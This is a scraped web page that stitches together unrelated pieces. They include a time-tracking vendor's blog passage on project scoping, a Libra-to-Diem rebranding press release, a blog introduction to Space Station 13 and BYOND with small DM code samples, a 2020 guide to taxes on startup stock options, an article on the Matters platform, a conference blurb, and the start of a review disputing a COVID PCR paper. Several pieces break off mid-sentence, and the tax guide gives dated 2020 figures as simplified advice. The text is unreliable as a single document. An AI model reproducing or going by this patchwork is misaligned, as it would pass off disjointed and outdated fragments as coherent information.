<p>Every team has <a href="https://www.7pace.com/blog/autonomy-software-teams">different work styles and methodologies</a>. Now’s the time to take your rough project schedule, and adapt it as needed to fit how your team works. This may mean breaking the first phase or milestone into your first sprints. It may mean assigning certain milestones to certain stakeholders to oversee. This will be different for every team.</p>



<h3>Step 4: Compile Your Scope and Review</h3>



<p>Now that you’ve gathered so much project information and turned it into a project scope, it’s time to review it —&nbsp;with other stakeholders, if necessary —&nbsp;and make any adjustments as needed. This is also the time to put the scope in writing and make sure it’s agreed upon by all the major stakeholders in the project. That way, you can refer back to your scope agreement throughout the duration of the work, and treat it as a guide for making changes or decisions. This can also help avoid scope creep, or any changes that will require time or money you don’t have.</p>



<p>The scope agreement may not be perfect, but having it in place can help negotiations go smoother if your estimates do turn out to be wrong, and you need to make scope adjustments as the project moves forward.</p>



<h2>For More Accurate Scoping, You Need Historical Data</h2>



<p>One great way for teams to find a starting point for scoping work (even on projects they’ve never tackled before) is by looking at historical data.</p>



<p>We know that time tracking isn’t the most popular thing among software teams (because <a href="https://www.7pace.com/blog/timekeeping-is-not-toxix">so many managers use it as a way to micromanage their developers’ time</a>). But we think time tracking can be so much more than that. We think it can be a powerful, if often overlooked, tool that software teams can use to make themselves better.</p>



<p><a href="https://www.7pace.com/timetracker">7pace Timetracker</a> is built by developers, for developers. It’s meant to be a timetracker that runs fully in the background so you don’t even notice it’s there. But all the while, it’s collecting data about the time you and your team spend working, and compiling that data so you can use it to identify your <a href="https://www.7pace.com/blog/software-development-pace-calculation">pace</a>, <a href="https://www.7pace.com/blog/what-causes-software-bugs">hurdles</a>, and successes — as an individual dev or as a team. The best part? You can use that data to help scope work —&nbsp;even when it’s work you’ve never done before.</p>



<p>We’re not saying this is a silver bullet. Accurately estimating work scopes, particularly on new types of projects, will probably always be a challenge for developers. But by using the right tools, teams can continue to improve their scoping skills.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Washington, D.C.</em> – The Libra Association announces the adoption of a new name and the recruitment of key executives, reinforcing its organizational independence. Now transitioning to the name “Diem”, which denotes a new day for the project, the Diem Association will continue to pursue a mission of building a safe, secure and compliant payment system that empowers people and businesses around the world.</p>
<p>The Association has been focused on ensuring that the project is designed to meet regulatory expectations, consistent with the Association’s guiding principles of innovation, inclusion, and integrity. “The Diem project will provide a simple platform for fintech innovation to thrive and enable consumers and businesses to conduct instantaneous, low-cost, highly secure transactions,” said Stuart Levey, the Diem Association’s CEO. “We are committed to doing so in a way that promotes financial inclusion – expanding access to those who need it most, and simultaneously protecting the integrity of the financial system by deterring and detecting illicit conduct. We are excited to introduce Diem – a new name that signals the project’s growing maturity and independence.”</p>
<p>As part of the effort to achieve regulatory approval and progress toward launch, Diem has recently attracted a group of world-class professionals to help lead the Association and Diem Networks, the subsidiary that is the regulated payment system operator. This includes the appointment of Dahlia Malkhi as the Association’s Chief Technology Officer, Christy Clark as Chief of Staff, Steve Bunnell as Chief Legal Officer, and Kiran Raj as Executive Vice President for Growth and Innovation and Deputy General Counsel.</p>
<p>Additionally, Diem Networks has recently announced the appointment of James Emmett as Managing Director, Sterling Daines, as Chief Compliance Officer, Ian Jenkins as Chief Financial and Risk Officer, and Saumya Bhavsar as General Counsel. “This is a stellar group of executives and having the Executive Committee of Diem Networks in place alongside existing leaders and colleagues is a critical step for Diem to operate with appropriate autonomy,” said Levey.</p>
<p>With the top team now in place, the Diem Association is prioritizing technological and operational readiness for launch. “The evolution of the project results from constructive ongoing engagement with governments, regulators and other key stakeholders,” said Levey. There is growing consensus around the world on the need to modernize financial infrastructure and regulatory frameworks to meet changing consumer demands and keep pace with global innovation in digital payments. The Association has committed that it will proceed only upon receiving regulatory approval, including a payment systems license for the operational subsidiary of the Association from FINMA. The licensing process is ongoing and the operational subsidiary of the Association is in active and productive dialogue with FINMA.</p>

<h2 id="introduction">Introduction</h2>
<h3 id="the-game">The Game</h3>
<p><em><a href="https://spacestation13.com/">Space Station 13</a></em> (or <em>SS13</em>) is a multiplayer, top-down 2D RPG. There
are many different instances of SS13, boasting different codebases, features,
lore, and communities.</p>
<p><img src="https://blog.snowfrost.garden/1/bridge.png" alt=""></p>
<p>The core of the game, however, stays largely the same: the eponymous Space
Station 13, a research vessel operated by the pan-galactic corporate hegemon
NanoTrasen, is staffed by the players. The players take on various roles.
Janitors, scientists, cooks, bartenders, cargo technicians, security guards, and
the various heads of departments, all the way up to the Captain of the station,
all have duties to fulfill in order to ensure the operation of the station.</p>
<p>Every shift, a new shuttle full of crew arrive to the station. Most roles are
self-explanatory, but research, supply, and engineering, as well as other
departments, have specific goals to investigate materials, perform research,
design viruses and analyze genetics. If nothing goes wrong, and it’s time for
the crew to leave, the return shuttle arrives, and the crew hops off the
station, ending the shift.</p>
<p>Every shift, something goes wrong.</p>
<p><img src="https://blog.snowfrost.garden/1/ss13_demo1.png" alt=""></p>
<p>It could be something relatively benign. Science is screwing around and not
doing important research. There’s no chef, and the morale of a hungry crew
continues to plummet. The engine isn’t outputting enough, so some of the
departments lose power. Maybe the station is just a gross mess and the janitors
are nowhere to be found.</p>
<p><img src="https://blog.snowfrost.garden/1/barp.png" alt=""></p>
<p>Then, there are the <em>antagonists</em>. Every shift, some crew members may be
clandestine agents working for NanoTrasen’s sworn enemy, the cabal of
hyper-corporations called the Syndicate. They may need to steal something
valuable, or kill someone important.</p>
<p>But that’s really the tip of the iceberg. The extra-terrestial and supernatural
always have their eyes on Space Station 13.</p>
<p>A meteor shower bombards the station, necessitating massive repairs. The miners
get killed under mysterious circumstances on the local planet. There may be
changelings, shapeshifting worms piloting a person’s body from the inside, with
the object of killing and taking on the appearance of other crew members without
detection.</p>
<p><img src="https://blog.snowfrost.garden/1/legion.png" alt=""></p>
<p>There could be vampires, pan-dimensional beings that feed on crew and gain
terrifying powers in return. It could be a squadron of nuclear operatives
hellbent on wiping the station off the face of the galaxy. It could be a small
mouse that bursts into a cancerous blob that slowly begins taking over the
station, room by room, breeding horrifying creatures that attack the crew.</p>
<p><img src="https://blog.snowfrost.garden/1/blobber.png" alt=""></p>
<p>Or the singularity engine breaks loose of its containment shielding and starts
devouring the station, growing more and more powerful with all the matter it
consumes, until there’s no one left to take the return shuttle.</p>
<p>In short, a lot can happen on Space Station 13, and it’s up to the intrepid crew
to pull together, survive, and stay alive until the shift is over.</p>
<h3 id="introducing-byond">Introducing BYOND</h3>
<p>SS13 is built on a small, independent software platform called <em>BYOND</em>. BYOND,
and its tools, are free to use, and are designed to make game
programming—networked game programming especially—accessible to users who are
not necessarily tech savvy, although at this point in the platform’s lifetime,
teams of programmers have managed to build sophisticated libraries and games on
it, and a mature ecosystem around it.</p>
<p>The BYOND platform is 24 years old. I’ll emphasize that: it was first released
in 1996. It is regularly updated, to this day. Game makers register their game
with BYOND’s API, and the interface for browsing and connecting to games (called
<em>Dream Seeker</em>) will then show that game within its directory. SS13, the largest
draw on BYOND, has anywhere from 500-1500 players on it on average. A handful of
other games hit triple digits.</p>
<p>As a point of comparison, at the time of writing, the top 25 multiplayer games
currently being played on Steam all have at least an order of magnitude more
than that, with the top four (CS:GO, Dota, Among Us and PUBG) having over
100,000 concurrent players. A handful of games, at their all-time peak, have had
millions of concurrent players.</p>
<p>This is not meant to be disparaging. Rather, SS13 has a serious cult following;
a quietly popular game that is just as enjoyable to watch as it is to
play. Streamers on YouTube and Twitch can receive hundreds of thousands of
cumulative views of their SS13 play-throughs.</p>
<p>In order to achieve its goal of making game programming accessible, BYOND comes
bundled with everything needed to write a game from scratch: an engine, a
multiplayer server hub, and a no-frills IDE called Dream Maker that includes a
tile-based map editor and graphics tool.</p>
<h2 id="background">Background</h2>
<h3 id="the-byond-api">The BYOND API</h3>
<p>The BYOND API, as I’m describing it, includes the high-level mechanics and
abstractions exposed to users as the building blocks for their games, and we are
going to start there.</p>
<p>Here I’d like to add a personal disclaimer: <strong>I have not spent any serious
amount of time writing in the DM language</strong>. This means that aside from existing
codebases, my only other sources of information on the API and language are the
<em><a href="http://www.byond.com/docs/guide/guide.pdf">Designer’s Guide</a></em> and the <a href="https://secure.byond.com/docs/ref/">Dreammaker Reference</a> documentation available
publicly. I may have over- or under-estimated the abilities of the language, and
what’s strictly necessary to transpile it.</p>
<p>Game worlds in BYOND are made up of two-dimensional levels. Every level has its
own drawing order, and each cell in the level (a.k.a. <em>tiles</em>) may have one
<code>/area</code>, one <code>/turf</code>, and multiple objects and moving entities, known
respectively as <code>/obj</code> and <code>/mob</code> types. Every entity in the
game world is represented as a type in a hierarchical object system. For
example, both <code>/obj</code> and <code>/mob</code>.</p>
<p>Variables and fields are flexible container-types, and will accept assignment of
most other objects or primitives.</p>
<p>All procs are declared as belonging to some object’s type. Objects have the
ability to call procs attached to other objects, as well as have procs from
other objects called within their context. In other words, the <code>src</code> (the entity
owning the proc) is not necessarily the <code>usr</code> (the entity which invoked the
proc), and this distinction is typically defined by the in-game distance and
visibility of the entities in question.</p>
<p>For example, if one has a magic cloak in game, one would only want it to work if
it were being worn by someone. The API provides a pseudo-inventory,
<code>usr.contents</code>, so we can restrict invocation of the relevant proc like so:</p>
<pre><code>/obj/magic_cloak/verb/disappear()
  set src = usr.contents
  usr.invisibility = 1
</code></pre>
<p>Now <code>disappear</code> can only be called if the cloak is in the caller’s inventory.</p>
<p>The documentation makes a distinction between <em>procs</em> and <em>verbs</em> but
syntactically they are equivalent, as far as I can tell, and the <em>Designer’s
Guide</em> has verbiage to that effect.</p>
<p>The canonical DM “Hello, World” in the <em>Guide</em> looks like this:</p>
<pre><code>/mob/proc/Login()
  world &lt;&lt; "Hello world!"
</code></pre>
<p>Indentation is whitespace-significant, as in Python. A separate syntax for
declarations, using stair-stepping, is supported:</p>
<pre><code>mob
  Login()
    world &lt;&lt; "Hello world!"
</code></pre>
<p>The former style is preferred.</p>
<p>Entities, even user-written ones, are all somewhere on the object tree, and may
subclass each other. For example, <code>/obj</code> is the tail node of its branch, and one
may define both <code>/obj/animal</code> and <code>/obj/animal/cat</code>, with all of the
90s-OOP-craze inheritance it implies.</p>
<p>The language is meant to be accessible but powerful, and where it does not
support server-side features, a DLL interface is provided, which current
programmers take full advantage of.</p>
<h2 id="introducing-donk-project">Introducing Donk Project</h2>
<h3 id="the-curse">The Curse</h3>
<p>The <em>Curse</em> has been described variously. In the simplest terms, the Curse is
the mysterious force that prevents the success of a remake of SS13 into a modern
codebase with a supportive community. The Curse has seemingly taken a half dozen
projects down this road. The 2016 article <em><a href="https://medium.com/@treeform/space-station-13-remakes-9b985e2269da">Space Station 13
Remakes</a></em> documents 14 projects that could be considered direct or
close spiritual successors to SS13. Out of those, only SS14 is still active, as
far as I can tell.</p>
<p>At the moment, there are two claimants to the title of Curse-Breaker: <em><a href="https://store.steampowered.com/app/1255460/Space_Station_14/">SS14</a></em>
and <em><a href="https://store.steampowered.com/app/801140/Unitystation/">Unitystation</a></em>.</p>
<p><img src="https://blog.snowfrost.garden/1/ss14.jpg" alt=""></p>
<p>SS14 is written in C#, and asserts itself as a “completely different project
with it’s <em>[sic]</em> own design decisions, goals” and “runs on an entirely different
engine”. It is working to rethink the fundamentals of SS13, from how people are
identified visually, to the combat system, to rewriting how entire departments
operate.</p>
<p>SS14 is currently very robust, with a translation of the pixel animation format
to a smoother, more modern feel, highlighted items, and secondary menus. Since
server administration and performance is a critical aspect of running a game
such as this, SS14 also provides web-based server monitoring and telemetry.</p>
<p>At the time of this writing, SS14 has an estimated release date of Fall 2020.</p>
<p><img src="https://blog.snowfrost.garden/1/unitystation.jpg" alt=""></p>
<p>Unitystation, as its name might imply, is a port of SS13 to the popular Unity
engine. According to their Steam page:</p>
<blockquote>
<p>Unitystation is about 1/4th of the way through its development goals in
reaching a version 1.0, which will include most features found in a standard
game of Space Station 13 on BYOND.</p>
</blockquote>
<p>One can take this to imply that Unitystation’s goals are a more direct
interpretation of SS13’s gameplay: hoping to provide an experience of similar
fidelity, but with modern graphics, UI, and so on.</p>
<p>At the time of this writing, Unitystation has an estimated release date of
Winter 2021.</p>
<p>Any attempts which try to implement the engine—and then SS13’s complex and
intricate mechanics on top of it—is likely to be a complex, uphill battle. And
in a world where Unity and other sophisticated engines provide the power to
recreate the game’s mechanics, it’s then up to the developers to bring the
effort needed to …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><h3>“We’re going public!”</h3></p><div><section>
  <p>For a startup employee, learning about your company’s initial public offering (IPO) is an exciting time. But it’s also overwhelming from a financial planning perspective. You have a variety of different equity grants, and you must decide what to do with each one. How many stock options should you exercise and sell, and when? What will your tax obligations be, and how can you minimize them?</p>
  <p>This guide covers what a startup employee needs to know to make well-informed decisions about all of this. We’ll start with tax considerations around exercising and selling stock. Then, we’ll discuss strategies and timelines for selling stock after the IPO. Finally, we’ll go over ways to further minimize your tax burden after selling.
  </p>
</section></div><h3>Taxes</h3><div><section>
<p>Money made from selling stock is taxed either as ordinary income (i.e. <span>federal<label for="sn-federal"></label></span><span>In 2020, the federal tax brackets
        were: 10%, 12%, 22%, 24%, 32%, 35%, and 37%. Your bracket depends on your income and filing status; more
        details
        <a href="https://www.nerdwallet.com/article/taxes/federal-income-tax-brackets">here.</a></span> plus
      <span>state<label for="sn-state"></label></span>
      
      <span>In 2020, California state tax brackets
        <a href="https://www.nerdwallet.com/article/taxes/california-state-tax#:~:text=California%20state%20tax%20brackets%20are,subject%20to%20California%20state%20tax.">ranged</a>from
        1% to 12.3%. New York state tax brackets
        <a href="https://www.tax-brackets.org/newyorktaxtable">ranged</a> from 4% to 8.82%. Your bracket
        depends on your income and filing status.</span>
      income taxes), or as long-term capital gains. If you acquire a stock (e.g. by exercising an option or vesting an
      RSU) and hold it for over a year before selling it, then your profit is classified as a long-term capital gain.
      Profits from stocks held for less than a year are short-term capital gains, and they’re taxed at the same rate
      as
      ordinary income.
    </p>
    <p>
      Long-term capital gains are taxed at about half the
      <span>ordinary income tax rate<label for="sn-oitr"></label></span>
      
      <span>For unmarried individuals, the long-term capital gains federal tax rate
        <a href="https://www.nerdwallet.com/article/taxes/capital-gains-tax-rates">is</a>: 0% for income below
        $40k; 15% for income
        between $40k-$441,450; 20% for income exceeding $441,450. In California, though, you’ll have to <a href="https://pocketsense.com/capital-gains-taxes-state-california-8405869.html">pay</a> additional
        state income tax on all capital gains (see footnote 2).</span>
      . So, in general, to minimize your tax
      burden, maximize your long-term capital gains.
    </p>

    <p>
      Let’s look at how this plays out for ISOs, NSOs, and RSUs.
    </p>

      Employee stock options represent the right to purchase a certain number of shares of your company at a certain
      price, once the options have vested. There are two types—ISOs and NSOs—and early-stage companies will typically
      issue a mix of both to their employees.
    </p>
    <p>
      For each tranche of options that you’ve been issued, be aware of three key numbers:
    </p>
    <ul>
      <li>Your strike price (aka exercise price): how much you pay to purchase each share.</li>
      <li>The 409A value (aka fair market value) of the shares, as of the time you exercise the options. For private
        companies, the 409A value is an independent appraisal of how much the private company’s stock is worth. After
        the
        IPO, this value becomes
        <span>the company’s public stock price.<label for="sn-psp"></label></span>
        
        <span>Leading up to the IPO, the fair market value of your shares will likely rise greatly
          towards the company’s preferred price (or at least fluctuate). These fluctuations may greatly impact your tax
          calculations, and your company's finance team should keep you up-to-date on them.</span></li>
      <li>Your sale price: the price at which you later sell the shares.</li>
    </ul>

    <p>
      On a high level, here is the difference between ISOs and NSOs:
    </p>
    <p>
      <b>For NSOs</b>
    </p><ul>
      <li>Pay ordinary income tax on (409A value - exercise price) when you exercise your options. So, if you pay $2 to
        purchase each share and the 409A value is $10, then you’re taxed on the $8 spread.</li>
      <li>Pay
        <span>capital gains tax<label for="sn-cgt"></label></span>
        
        <span>Depending whether you held the shares for over a year before selling them, you’ll either
          pay long-term capital gains or ordinary income tax on them.</span>
        on (sale price - 409A at the time of exercise) when you sell the shares. So, if you exercise the shares when the
        409A value is $10, then sell those shares for $50, then you’ll be taxed on the $40 capital gain.</li>
    </ul>
    

    <p>
      <b>For ISOs</b>
    </p><ul>
      <li>Pay no tax when you exercise—unless you trigger the AMT (details below)</li>
      <li>Pay long-term capital gains tax on (sale price - exercise price) when you sell—if the shares are sold at least
        one year after exercising, and at least two years after your options were granted. Otherwise, (sale price -
        exercise price) will be taxed as short-term capital gains (roughly ordinary income). </li>
    </ul>

<p>
      Upon exercising your ISOs, you will likely qualify for the Alternative Minimum Tax, or
      <span>AMT.<label for="sn-amt"></label></span>
      
      <span>Back in 1969, 155 individuals with incomes over $200,000 managed to pay zero federal income
        taxes, triggering popular outrage. The AMT was introduced to prevent this from happening again.</span>
    </p>
    <p>
      The AMT is calculated based on the bargain element: the (409A value - exercise price). You owe AMT if:
    </p>
    <ol type="1">
      <li>
        Your total bargain value ( [409A value - exercise price] * total ISOs exercised ) exceeds the AMT exemption
        amount (which
        was
        <span>$72,900 for unmarried individuals<label for="sn-amt"></label></span>
        
        <span>For married couples filing jointly, the 2020 AMT exemption amount was $113,400.</span>
        in 2020).

      </li>
      <li>
        The tax you owe under the <span>AMT calculation<label for="sn-amtcalc"></label></span>
        
        <span>We won’t discuss how to calculate your exact AMT burden in this article, but it will come
          out to 26-28% of your total bargain value.

        </span>
        exceeds the tax you owe under regular tax calculations.
      </li>
    </ol>
  

    <p>
      You will have to pay AMT when you file your tax return for the year that you exercise your ISOs (it is not
      withheld at the time you exercise), so make sure to plan accordingly.
    </p>
</section></div><h4>AMT Credits<br></h4><div><section> 
<p>
      Upon exercising your ISOs, you pay AMT . Then, when you
      sell those shares, you’re taxed again on your capital gains. To lessen the blow of thus being taxed twice on ISOs,
      Congress introduced AMT credits.
    </p>
    <p>
      Suppose you paid $5000 in AMT in 2019. In any subsequent year where you don't owe AMT (say, 2020), you might be
      able to get back some or all of that $5000. There are a few
      conditions for getting this tax credit:
    </p>
    <ol type="1">
      <li>You can't owe AMT in 2020.</li>
      <li>The maximum amount of AMT credit you can claim for 2020 is [regular tax bill for 2020 - AMT amount for 2020].
        After you claim your credits for 2020, any of the original $5000 that's left over can be used toward a
        subsequent year's tax deduction.</li>
    </ol>
    <p>
      There are many other caveats that may warrant speaking with a financial advisor. But the bottom line is: you may
      want to try to strategically maximize the amount of AMT credit that you can claim later. Or, you can limit the
      number of ISOs that you exercise and stay below the AMT exemption amount (thus avoiding the AMT altogether).
    </p>
</section></div><h4>Restricted Stock Units (RSUs)<br></h4><div><section> 
<p>
      RSUs turn into shares of your company’s stock when they vest. They’re typically issued by companies valued at over
      $1 billion.
    </p>
    <p>
      RSUs are subject to either single- or double-trigger vesting. Single-trigger RSUs can vest before IPO. This means
      you’ll owe taxes on them as they vest (because you’re coming into ownership of new shares of stock). However, if
      the company is still private, you won’t be able to sell those shares to make money to pay the taxes you owe on
      them.
    </p>
    <p>
      That’s why many companies instead offer double-trigger RSUs, which only vest after the IPO. That way, you’ll only
      owe taxes once the company is public and you can actually sell those shares. So, for the year that your company
      IPOs, be prepared to pay taxes on
      <span>any double-trigger RSUs that you vest.<label for="sn-dtr"></label></span>
      
      <span>Your RSUs may vest either on IPO day or after the lockup period, depending on the
        company.</span>
    </p>
    <p>
      When your RSUs vest (whether before or after IPO), you’ll owe ordinary income tax on the
      <span>409A value of your newly issued shares as of that day.<label for="sn-4nid"></label></span>
      
      <span>As a reminder, the 409A value after IPO is equivalent to the company’s public stock
        price.</span>
      Then, when you sell those shares, your profit (i.e. [sale price - 409A value as of the day the shares vested])
      <span>will be taxed as capital gains.<label for="sn-wtcp"></label></span>
      
      <span>Again, these qualify for long-term capital gains tax treatment if you hold onto the shares
        for over a year.</span>

      You can actually exempt your stock from all the federal taxes we’ve discussed above, if it counts as qualified
      small business stock (QSBS). Your stock might qualify as QSBS if:
    </p>
    <ul>
      <li>At the time that your stock was issued (i.e. when you exercised your options), your company’s gross assets did
        not exceed $50 million.</li>
      <li>You’ve held the stock for at least five years before selling it.</li>
    </ul>
    <p>
      There are a number of <a href="https://www.investopedia.com/terms/q/qsbs-qualified-small-business-stock.asp"></a>other caveats. But, if
      you can get QSBS treatment, you’ll almost certainly save a lot of
      money in taxes.
    </p>
</section></div><h3>Selling your stock<br></h3><div><section>
<p>
      With these tax considerations in mind, let’s discuss plans for selling your shares.
    </p>
    <p>The soonest that you can sell your shares is after the lockup period. The lockup period lasts around six months,
      starting from the IPO date, and is meant to prevent employees from flooding the market with their shares
      <span>(and thus lowering the stock price).<label for="sn-lup"></label></span>
      
      <span>This is generally true for traditional IPOs. If your company is going public via a direct
        listing, there might not be a lockup period.</span>
      After the lockup period, employees generally employ one of a few selling strategies:
    </p>
    <ul>
      <li>Sell most of their equity immediately.</li>
      <li>Sell most of their shares as soon as they qualify for long-term capital gains tax treatment.</li>
      <li>Plan to sell a constant number …</li></ul></section></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Two weeks after 1 million people took to the streets of Hong Kong last June, Qin, a Chinese writer and feminist activist, published an 8,000-word essay on her WeChat blog. The protests in the city had evolved from demonstrations against a law allowing criminal suspects to be deported to the mainland into a broader call for democracy and opposition to centralized control by Beijing. Qin, who is based in New York and writes under the pename 米米亚娜 (Mimiyana), was conflicted, feeling she no longer fit in on either side of the growing political divide.&nbsp;</p>



<p>Her piece, headlined “I didn’t know I could feel like a stray dog in my life,” was viewed around 25,000 times within 24 hours of its posting — but was then removed from WeChat, which is often censored. Soon afterward, a staff member from Matters, a new platform hosting writing for Mandarin and Cantonese speakers, approached Qin and encouraged her to repost the piece. “After my first visit [to the website], I felt like I had finally found a sanctuary,” Qin, who asked to be identified only by her family name, tells <em>Rest of World</em>.&nbsp;</p>



<p>Matters was launched in 2018 by Zhang Jieping, a journalist who began her career in newsrooms in Hong Kong, before leaving in 2015 to establish <em>Initium</em>, a successful digital magazine. Yet even at her own outlet, she felt that the Hong Kong media was struggling to understand the profound political changes happening on its doorstep. The city’s unique freedoms and character were being eroded by Beijing in, she says, a “vortex” of political pressures and resistance, but the press coverage, she felt, was inward-looking.</p>



<p>“But journalists are not the only people in the vortex,” Zhang says. “Everyone is in it together. It would be much better if everyone, instead of only the media, had a voice.”</p>



<p>Around the time that she was considering her next move, a new way of funding and building newsrooms was emerging in the West. In 2016, startups like Civil and Steemit had begun proposing using blockchain to build self-funded, decentralized content platforms.<strong> </strong>Zhang found the idea compelling — a decentralized platform would be both easy for anyone to use and hard for authorities to censor or delete, while a cryptocurrency would allow readers to support writers the world over.&nbsp;</p>



<p>The blockchain media mania has since subsided. (Civil closed down in June 2020.) But Matters remains in operation, continuing to give a platform to prominent writers and public intellectuals. With the space for free speech rapidly diminishing in China, and particularly in Hong Kong, where a new national security law has had a chilling effect on media, Matters is one of the few remaining online venues where users from across the political spectrum can engage in discussion and debate.&nbsp;</p>



<p>“I started [Matters] because I knew it would be needed at a time like this,” Zhang says.</p>



<p>Not long ago, the Chinese internet allowed for a far more diverse range of political expression. In the early 2000s, Reddit-like forums hosted frank political discussions. Weibo, the Chinese microblogging site that launched in 2009, along with homegrown platforms like Zhihu and Douban, was known for its role in shaping the public discourse around social justice. But under its current president, Xi Jinping, the Chinese government has taken an authoritarian and nationalist turn.&nbsp;</p>

<p>“There were serious, sincere, and valuable discussions happening on [these platforms], and the vibe was relatively friendly. But those are long gone,” says Humar Isaac, a Uighur human rights activist born in Xinjiang, China, who now lives in exile in Sweden. Isaac joined Matters in June 2019. Her first article was about her parents, who were victims of China’s “reeducation camps.”&nbsp;</p>



<p>Lately, the polarization on Chinese-language platforms has become more pronounced than ever. Users tend to reflexively rally behind their identities — nationalist, pro–Hong Kong, pro-Taiwan — with little space for compromise. <a href="http://ft.com/content/9ef9f592-e2bd-11e7-97e2-916d4fbac0da">Trolling, doxxing, and personal attacks are common</a>.</p>



<p>Matters, in contrast, takes pride in showcasing a diverse range of voices and promoting less-represented writers from Singapore and Malaysia. While most of the site’s users are from mainland China and Taiwan, many Hong Kongers also read it regularly. In recent months, it has been dominated by conversations about the Hong Kong protests and national identity, issues controversial across the Chinese-speaking world. Unlike most other platforms, Matters has sought to build bridges between ideological factions who would otherwise be wary of talking to one another, at the risk of being villainized by all of them.</p>



<p>Since September, the U.S. government–funded, Chinese-language news site WhyNot has been publishing on Matters. Zhang says that the platform would be equally prepared to allow Communist Party–backed publications to post.</p>



<p>Matters opened up for public registration in May 2019, as Hong Kong’s protests gathered momentum. The platform carried writing from the perspectives of <a href="https://matters.news/@feano/%E4%B8%80%E4%B8%AA%E5%A4%A7%E9%99%86%E5%AD%A6%E7%94%9F%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E5%A3%B0%E9%9F%B3-zdpuApwK98VnSKQS4ucPeWWzQf852wPHg7dAaNB2Bf5VCkvGd">a mainland Chinese student</a>, <a href="https://matters.news/@leungkaichihk/%E9%A6%99%E6%B8%AF%E4%B9%8B%E5%A4%8F-%E8%AA%A4%E8%AE%80%E8%88%87%E7%9C%9F%E7%9B%B8-zdpuB37rgNnWAtUraUQCdmwohCCNGqLbs5cEmescBxTdbSfas">a Hong Kong professor</a>, and someone <a href="https://matters.news/@juliahe221/%E9%AB%98%E5%A2%99%E4%B8%8B-%E6%9A%97%E6%81%8B%E5%AF%B9%E8%B1%A1%E8%BD%AC%E5%8F%91%E4%BA%86-%E6%88%91%E6%98%AF14%E4%BA%BF%E6%8A%A4%E6%97%97%E6%89%8B%E4%B9%8B%E4%B8%80-zdpuAwmTQASn7QycGJ9ET3bLD2sFKo7izQCGdQ8dVyMD9xtyQ">who had found out her crush was a Chinese nationalist</a>.&nbsp;</p>



<p>The fallout from those protests has meant a riskier climate for writers who address sensitive topics — and for the platforms hosting them. In August, Jimmy Lai, the publisher of the pro-democracy Hong Kong newspaper <em>Apple Daily</em>, was arrested under a new national-security law, a vaguely worded piece of legislation that seems to criminalize all criticism of the government. Matters has since registered as a U.S. company, but it is unclear how much protection that will offer it, since the wording of the national security law suggests it can be applied to anyone, anywhere in the world.</p>



<p>Matters users have also noticed the emergence of “little pinks” — Chinese nationalists who troll and attack people online with opposing views. Some writers have felt compelled to take on aliases. Since last year, Matters has also uncovered numerous bots on the site. For Qin, the writer from China, the abuse is a reminder that her sanctuary is fragile. “When the larger Chinese-language environment is deteriorating, it’s pretty naive to assume you can retain a small safe space,” she says.</p>

<p>While writers have come to value the space that Matters provides for discussion, the financial side of the platform has never really taken off. When Matters first launched, it promised to release a blockchain-backed token to pay writers wherever they lived, free from foreign-exchange restrictions, a serious issue for mainlanders because of China’s tight control of capital outflows.&nbsp;</p>



<p>But because the value of cryptocurrencies is notoriously volatile, Zhang soon realized that Matters risked spending all its effort stabilizing the token price, rather than building a community of readers and writers. So Zhang teamed up with LikeCoin, creator of a third-party token developed by Kin Ko, a Hong Kong entrepreneur. LikeCoin was designed as an infrastructure for decision making, rather than a form of payment — buyers are paying for a say in what qualifies as quality content. And yet, while readers can “tip” writers with LikeCoin to show their support, the current value of the token is less than 1 cent. (In late 2019, Matters changed its slogan from “Writing pays” to “Writing is the easiest route to freedom.”)</p>



<p>Despite the setbacks, Zhang still sees blockchain as the heart of the platform. The leaderless, distributed protest movement in Hong Kong shows that it is possible to build something both decentralized and organized. She believes that blockchain will allow the Matters users to collectively determine its rules, and to decide what content has value.</p>



<p>This distinguishes Matters from mainstream social media platforms, which have been accused from many quarters of fueling political and social division. Facebook and TikTok may look like democratic spaces where people can organize freely, but users’ interactions are guided by opaque corporate decisions and algorithms, Zhang says.&nbsp;</p>



<p>“For me, users of Facebook are the same as people living in authoritarian states. It looks like everyone is allowed a bit of freedom, but the person-to-person network is disbanded,” she says.&nbsp;</p>



<p>Zhang believes that it is inevitable — and necessary — that independent Chinese language media, despite the failures of its predecessors, will shift toward decentralized platforms like Matters, as the state, and compliant technology platforms, exerts ever greater influence over what users see and how they write.&nbsp;</p>



<p>“We need to explore [decentralization] more actively before how we live and how information spreads are redefined, unbeknownst to us, by big powers like states or commercial platforms,” Zhang says. “That’s what I really believe in.”</p>

        <strong>Rebase</strong> is a new conference for and by practitioners who want to engage academics about tomorrow's technologies while fondly recalling the achievements of yesterday.
      </p>
      
      <p>
        This year, <strong>Rebase</strong> was planned to occur twice, once in Berlin
        with the <a href="https://2020.ecoop.org/">ECOOP</a> conference and
        once in Chicago with the <a href="https://2020.splashcon.org/">SPLASH</a> conference.
        Due to outside forces, there will be a single virtual event.
      </p>
      
      <p>
        <strong>Rebase</strong> will use the Clowdr platform for interaction,
        registration allows attendees to ask questions and meet with each other
        and with speaker. Registration also give access to all of the
        <a href="https://2020.splashcon.org/">SPLASH</a> co-located events.

<p>In the publication entitled “Detection of 2019 novel coronavirus (2019-nCoV) by real-time RT-PCR” (Eurosurveillance 25(8) 2020) the authors present a diagnostic workflow and RT-qPCR protocol for detection and diagnostics of 2019-nCoV (now known as SARS-CoV-2), which they claim to be validated, as well as being a robust diagnostic methodology for use in public-health laboratory settings.&nbsp;</p>



<p>In light of all the consequences resulting from this very publication for societies worldwide, a group of independent researchers performed a point-by-point review of the aforesaid publication in which 1) all components of the presented test design were cross checked, 2) the RT-qPCR protocol-recommendations were assessed w.r.t. good laboratory practice, and 3) parameters examined against relevant scientific literature covering the field.&nbsp;</p>



